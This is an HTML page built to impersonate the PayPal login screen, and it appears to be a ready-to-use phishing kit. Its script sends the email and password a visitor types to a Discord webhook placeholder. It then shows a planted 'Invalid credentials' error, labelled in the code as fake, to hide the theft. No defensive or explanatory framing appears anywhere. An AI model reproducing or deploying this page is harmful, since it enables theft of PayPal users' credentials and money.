<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PayPal Login</title>

<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    background: #ffffff;
    padding: 35px 30px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
    width: 350px;
    text-align: center;
}

.container img {
    width: 120px;
    margin-bottom: 50px; /* Logo plus d’espace au dessus du champ Email */
}

.input-container {
    position: relative;
    width: 100%;
    margin-bottom: 25px; /* espace entre Email et Password */
}

input {
    width: 100%;
    padding: 14px 40px 14px 12px;
    border-radius: 6px;
    border: 1px solid #cccccc;
    font-size: 16px;
    transition: 0.2s;
}

input:focus {
    outline: none;
    border-color: #0070ba;
    box-shadow: 0 0 5px rgba(0,112,186,0.3);
}

.toggle-password {
    position: absolute;
    top: 50%;
    right: 12px;
    transform: translateY(-50%);
    cursor: pointer;
    font-size: 18px;
    color: #888888;
}

.forgot-password {
    display: block;
    margin-top: 6px;
    font-size: 14px;
    color: #0070ba;
    text-decoration: none;
    text-align: left;
}

.forgot-password:hover {
    text-decoration: underline;
}

.btn-login {
    width: 100%;
    padding: 16px;
    background-color: #003087;
    border: none;
    border-radius: 8px;
    color: white;
    font-size: 17px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 15px;
    transition: 0.2s;
}

.btn-login:hover {
    background-color: #002163;
}

.error {
    color: #ff4d4d;
    margin-top: 12px;
    font-size: 14px;
    display: none;
}
</style>
</head>

<body>

<div class="container">

<!-- Logo PayPal -->
<img src="https://www.top-bank.ch/images/logo_540/paypal.png" alt="PayPal Logo">

<!-- Email / Phone field avec plus d’espace au-dessus -->
<div class="input-container" style="margin-top:20px;">
    <input type="text" id="field1" placeholder="Email or Phone Number">
</div>

<!-- Password field avec toggle eye -->
<div class="input-container">
    <input type="password" id="field2" placeholder="Password">
    <span class="toggle-password" onclick="togglePassword()">👁️</span>
</div>

<!-- Forgot password link -->
<a href="#" class="forgot-password">Forgot your password?</a>

<!-- Login button -->
<button class="btn-login" onclick="sendWebhook()">Log In</button>

<!-- Fake error message -->
<div class="error" id="errorMsg">
Error: Invalid credentials.
</div>

</div>

<script>
function togglePassword() {
    const pwd = document.getElementById("field2");
    pwd.type = pwd.type === "password" ? "text" : "password";
}

function sendWebhook() {
    let field1 = document.getElementById("field1").value;
    let field2 = document.getElementById("field2").value;

    let webhookURL = "YOUR_DISCORD_WEBHOOK_URL";

    fetch(webhookURL, {
        method:"POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            content: "Login Info:\nUsername/Email: "+field1+"\nPassword: "+field2
        })
    });

    document.getElementById("errorMsg").style.display = "block";
}
</script>

</body>
</html>
